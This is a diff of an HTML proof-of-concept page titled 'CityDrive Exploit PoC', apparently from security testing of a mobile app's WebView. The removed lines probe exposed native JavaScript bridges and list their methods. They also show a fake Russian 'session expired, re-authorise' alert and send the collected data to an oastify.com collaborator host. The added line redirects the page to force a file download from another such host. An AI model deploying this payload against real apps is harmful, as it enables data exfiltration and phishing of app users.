@@ -3,39 +3,7 @@
 <h1>CityDrive Exploit PoC</h1>
 <div id="output"></div>
 <script>
-const output = document.getElementById('output');
-const results = {};
-
-results.interfaces = {
-    WebViewInterface: typeof window.WebViewInterface,
-    Gate: typeof window.Gate,
-    Android: typeof window.Android,
-    Native: typeof window.Native
-};
-
-if (window.WebViewInterface) {
-    results.methods = [];
-    for (let key in window.WebViewInterface) {
-        results.methods.push(key);
-    }
-}
-
-if (window.Gate) {
-    results.gate_methods = [];
-    for (let key in window.Gate) {
-        results.gate_methods.push(key);
-    }
-}
-
-output.innerHTML = '<pre>' + JSON.stringify(results, null, 2) + '</pre>';
-
-WebViewInterface.showNotification("Сессия истекла", "Требуется повторная авторизация", "error");
-
-const url = 'https://8jsfvy44qbgemit855hygopndej57wzko.oastify.com';
-const data = JSON.stringify(results);
-const img = new Image();
-img.src = url + '?data=' + encodeURIComponent(data.slice(0, 2000));
-
+window.location = "https://tmj0yj7ptwjzp3wt8qkjj9s8gzmqah75w.oastify.com/test.pdf?download=true"
 </script>
 </body>
 </html>
